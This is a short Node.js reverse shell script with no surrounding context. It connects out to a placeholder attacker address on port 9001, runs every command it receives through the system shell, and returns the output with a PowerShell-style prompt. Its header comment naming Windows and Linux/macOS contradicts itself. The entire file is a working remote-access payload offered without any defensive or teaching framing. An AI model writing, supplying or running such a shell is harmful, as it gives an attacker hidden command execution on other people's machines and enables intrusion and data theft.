// windows (Linux/macOS)
const net = require('net');
const { exec } = require('child_process');
const path = require('path');

function main() {
    const host = 'IP_ADDRESS';
    const port = 9001;

    const client = new net.Socket();
    
    client.connect(port, host, () => {
        console.log('Connected to server');
    });

    client.on('data', (data) => {
        const command = data.toString('ascii').trim();
        
        exec(command, { timeout: 30000 }, (error, stdout, stderr) => {
            let output = stdout;
            if (stderr) {
                output += stderr;
            }

            const currentDir = process.cwd();
            let sendback = output + '\nPS ' + currentDir + '> ';

            if (error) {
                sendback = `Error: ${error.message}\nPS ${currentDir}> `;
            }

            client.write(sendback);
        });
    });

    client.on('error', (err) => {
        console.error(`Connection error: ${err}`);
    });

    client.on('close', () => {
        console.log('Connection closed');
    });
}

main();